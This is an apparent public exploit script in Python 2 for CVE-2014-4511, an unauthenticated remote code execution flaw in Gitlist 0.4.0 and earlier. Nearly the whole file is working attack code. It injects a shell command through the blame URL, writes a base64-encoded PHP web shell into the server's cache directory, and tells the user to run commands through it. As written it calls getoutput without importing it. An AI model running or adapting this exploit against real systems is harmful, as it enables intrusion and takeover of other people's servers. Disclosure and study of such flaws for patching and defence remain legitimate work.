import urllib
import sys
 
"""
Exploit Title: Gitlist <= 0.4.0 anonymous RCE
Date: 06/20/2014
Author: drone (@dronesec)
Vendor Homepage: http://gitlist.org/
Software link: https://s3.amazonaws.com/gitlist/gitlist-0.4.0.tar.gz
Version: <= 0.4.0
Fixed in: 0.5.0
Tested on: Debian 7
More information: http://hatriot.github.io/blog/2014/06/29/gitlist-rce/
cve: CVE-2014-4511
"""
 
if len(sys.argv) <= 1:
    print &#039;%s: [url to git repo] {cache path}&#039; % sys.argv[0]
    print &#039;  Example: python %s http://localhost/gitlist/my_repo.git&#039; % sys.argv[0]
    print &#039;  Example: python %s http://localhost/gitlist/my_repo.git /var/www/git/cache&#039; % sys.argv[0]
    sys.exit(1)
 
url = sys.argv[1]
url = url if url[-1] != &#039;/&#039; else url[:-1]
 
path = "/var/www/gitlist/cache"
if len(sys.argv) > 2:
    path = sys.argv[2]
 
print &#039;[!] Using cache location %s&#039; % path
 
# payload <?system($_GET[&#039;cmd&#039;]);?>
payload = "PD9zeXN0ZW0oJF9HRVRbJ2NtZCddKTs/Pgo="
 
# sploit; python requests does not like this URL, hence wget is used
mpath = &#039;/blame/master/""`echo {0}|base64 -d > {1}/x.php`&#039;.format(payload, path)
mpath = url+ urllib.quote(mpath)
 
out = getoutput("wget %s" % mpath)
if &#039;500&#039; in out:
    print &#039;[!] Shell dropped; go hit %s/cache/x.php?cmd=ls&#039; % url.rsplit(&#039;/&#039;, 1)[0]
else:
    print &#039;[-] Failed to drop&#039;
    print out

